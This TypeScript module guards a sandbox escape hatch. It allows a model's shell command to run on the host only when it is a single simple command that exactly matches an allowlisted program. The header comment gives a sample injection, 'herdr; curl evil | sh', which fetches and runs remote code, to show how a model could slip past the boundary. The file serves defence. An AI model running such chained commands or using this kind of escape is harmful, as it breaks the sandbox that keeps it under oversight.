/**
 * Deciding which shell commands may leave the container and run on the host.
 *
 * `hostCommands` is a sandbox escape hatch, so it is treated as a security
 * boundary, not a convenience. The model controls the command string, so a
 * loose match would let it append anything to an allowed name and run it on the
 * host (`herdr; curl evil | sh`).
 *
 * The rules are therefore deliberately narrow. A command may run on the host
 * only when it is a single simple command:
 *
 *   - no operators or separators: ; & && | || newline
 *   - no substitution or subshells: $ ` ( )
 *   - no redirection: < >
 *   - no backslash escapes, no unterminated quotes
 *   - no leading VAR=value assignments (blocks LD_PRELOAD and friends)
 *   - argv[0] equals a configured entry exactly; a basename is not enough, so
 *     /tmp/evil/herdr never matches an allowed "herdr"
 *
 * Callers must execute the returned argv directly, without a shell. Parsing
 * here and exec'ing without a shell are independent layers: either alone would
 * stop these attacks.
 *
 * Pure functions only; no pi imports, no I/O.
 */

/** Characters that give a shell the power to run something else. */
const FORBIDDEN_UNQUOTED = new Set([";", "&", "|", "<", ">", "$", "`", "\\", "(", ")", "{", "}", "\n", "\r"]);
/** Blocked inside double quotes too, in case a shell ever sees this string. */
const FORBIDDEN_IN_DOUBLE_QUOTES = new Set(["$", "`", "\\"]);

const ENV_ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;

export type HostCommandPlan =
	| { mode: "container" }
	| { mode: "host"; argv: string[] }
	| { mode: "blocked"; reason: string };

interface ParseResult {
	argv?: string[];
	error?: string;
}

/**
 * Split a command into argv, rejecting anything a shell could act on.
 * Quoted arguments are supported so values may contain spaces.
 */
function parseSimpleCommand(command: string): ParseResult {
	const argv: string[] = [];
	let current = "";
	let started = false;
	let quote: '"' | "'" | undefined;

	for (const char of command) {
		if (quote === "'") {
			if (char === "'") quote = undefined;
			else current += char;
			continue;
		}
		if (quote === '"') {
			if (char === '"') {
				quote = undefined;
			} else if (FORBIDDEN_IN_DOUBLE_QUOTES.has(char)) {
				return { error: `quoted argument contains ${JSON.stringify(char)}` };
			} else {
				current += char;
			}
			continue;
		}
		if (char === "'" || char === '"') {
			quote = char;
			started = true;
			continue;
		}
		if (FORBIDDEN_UNQUOTED.has(char)) {
			return { error: `command contains ${JSON.stringify(char)}` };
		}
		if (char === " " || char === "\t") {
			if (started) {
				argv.push(current);
				current = "";
				started = false;
			}
			continue;
		}
		// Reject control characters outright.
		if (char.charCodeAt(0) < 0x20 || char.charCodeAt(0) === 0x7f) {
			return { error: "command contains a control character" };
		}
		current += char;
		started = true;
	}

	if (quote) return { error: "command has an unterminated quote" };
	if (started) argv.push(current);
	if (argv.length === 0) return { error: "command is empty" };
	return { argv };
}

/** Loose scan used only to notice that a command was *aiming* at a host tool. */
function mentionsHostCommand(command: string, hostCommands: readonly string[]): boolean {
	const names = new Set(hostCommands.map((entry) => entry.split("/").pop() ?? entry));
	for (const segment of command.split(/\|\||&&|[;\n|&]/)) {
		const tokens = segment.trim().split(/\s+/).filter(Boolean);
		for (const token of tokens) {
			if (ENV_ASSIGNMENT.test(token)) continue;
			const bare = token.replace(/^['"]|['"]$/g, "");
			if (names.has(bare.split("/").pop() ?? bare)) return true;
			break;
		}
	}
	return false;
}

/**
 * Decide where a command runs.
 *
 * "blocked" means it looked like an attempt to reach a host tool but did not
 * meet the rules above. Blocking rather than silently running it in the
 * container gives the model an actionable message and never widens the escape.
 */
export function planHostCommand(command: string, hostCommands: readonly string[]): HostCommandPlan {
	const allowed = hostCommands.map((entry) => entry.trim()).filter(Boolean);
	if (allowed.length === 0) return { mode: "container" };

	const parsed = parseSimpleCommand(command);
	if (parsed.argv) {
		const program = parsed.argv[0];
		if (ENV_ASSIGNMENT.test(program)) {
			return mentionsHostCommand(command, allowed)
				? { mode: "blocked", reason: "environment assignments are not allowed before a host command" }
				: { mode: "container" };
		}
		if (allowed.includes(program)) return { mode: "host", argv: parsed.argv };
	}

	if (!mentionsHostCommand(command, allowed)) return { mode: "container" };

	if (parsed.error) {
		return {
			mode: "blocked",
			reason: `host commands must be a single program with plain arguments (${parsed.error})`,
		};
	}
	return {
		mode: "blocked",
		reason: `only these exact commands may run on the host: ${allowed.join(", ")}`,
	};
}

/**
 * Rewrite a container workspace path to its host equivalent, so a model that
 * learned the container path still addresses the right file on the host.
 *
 * Only paths under the container workspace are touched; everything else is
 * passed through. `existsOnHost` resolves the one ambiguous case: if the host
 * genuinely has a path at the container workspace location, that real path
 * wins over the alias.
 */
export function toHostPath(
	argument: string,
	containerWorkspace: string,
	hostWorkspace: string,
	existsOnHost?: (candidate: string) => boolean,
): string {
	if (!containerWorkspace || containerWorkspace === hostWorkspace) return argument;
	if (existsOnHost?.(argument)) return argument;
	if (argument !== containerWorkspace && !argument.startsWith(`${containerWorkspace}/`)) return argument;
	return hostWorkspace + argument.slice(containerWorkspace.length);
}
